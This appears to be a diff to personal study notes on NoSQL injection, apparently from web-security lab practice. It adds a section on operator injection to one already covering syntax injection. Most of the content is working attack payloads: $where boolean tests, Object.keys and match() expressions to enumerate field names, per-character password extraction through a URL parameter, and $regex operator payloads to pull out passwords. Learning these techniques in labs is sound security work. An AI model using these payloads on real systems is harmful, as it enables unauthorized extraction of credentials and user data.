@@ -135,6 +135,7 @@ Example : IF you know that username field exists ,
           
 After this we maintain a list of potential fields with respect to the application being tested, and then find the existent fields.
 
+**EXPLOITING SYNTAX INJECTION TO EXTRACT DATA**
 **RULES TO PROCEED WITH FOR FINDING FIELDS AND EXPLOITING JS FUNCTIONS IF VULNERABLE**
 
 1. Start with checking if app is vulnerable by simple payloads.
@@ -172,3 +173,26 @@ GET users/lookup?user=admin'&&this.nonexistent.length>0 or this.nonexistent !=' 
 GET users/lookup?user=admin'&&this.password[0]=='a' || '1'=='2 #**make sure to url encode the payload**
 ```
 *we often would get the output as changed length in response intercepted by burpsuite.*
+
+---
+
+**EXPLOITING OPERATOR INJECTION TO EXTRACT DATA**
+
+1. TEST IF OPERATOR INJECTION IS POSSIBLE. Also test if it is evaluated rightly by sending one right and one false.
+```
+{"username":"wiener","password":"peter", "$where":"0"} #this evaluates to False
+{"username":"wiener","password":"peter", "$where":"1"} #this evaluates to True
+```
+
+2.Extracting field names
+If you have injected an operator that enables you to run JavaScript, then you can use *keys() and match()* method.
+
+```
+"$where":"Object.keys(this)[0].match('^.{0}a.*')"
+```
+
+3. Also exfiltrating data without javascript is possible by operators like regex.
+```
+{"username":"admin","password":{"$regex":"^.*"}}
+{"username":"admin","password":{"$regex":"^a.*"}} #for something beginning with a
+```
